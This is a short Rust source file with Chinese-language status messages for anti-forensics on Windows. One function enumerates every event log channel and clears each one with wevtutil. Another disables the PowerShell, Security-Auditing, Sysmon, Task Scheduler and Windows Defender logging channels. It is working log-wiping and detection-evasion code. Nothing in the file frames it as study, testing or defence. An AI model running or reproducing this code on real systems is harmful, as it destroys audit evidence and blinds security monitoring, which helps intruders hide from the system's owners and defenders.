use crate::common::Context;

pub fn clean_all_event_logs(ctx: &Context) {
    ctx.info("清除 Windows 事件日志...");

    let output = match std::process::Command::new("wevtutil").arg("el").output() {
        Ok(o) if o.status.success() => o,
        _ => {
            ctx.info("wevtutil 不可用，回退到文件删除模式");
            return;
        }
    };

    let channels = String::from_utf8_lossy(&output.stdout);
    for channel in channels.lines() {
        let ch = channel.trim();
        if ch.is_empty() {
            continue;
        }
        ctx.run_cmd(
            &format!("清除 Event Log: {}", ch),
            "wevtutil",
            &["cl", ch],
        );
    }
}

pub fn disable_event_logging(ctx: &Context) {
    ctx.info("禁用关键事件日志通道...");

    let channels = [
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-Security-Auditing",
        "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Microsoft-Windows-Windows Defender/Operational",
    ];

    for ch in &channels {
        ctx.run_cmd(
            &format!("禁用 {}", ch),
            "wevtutil",
            &["sl", ch, "/e:false"],
        );
    }
}
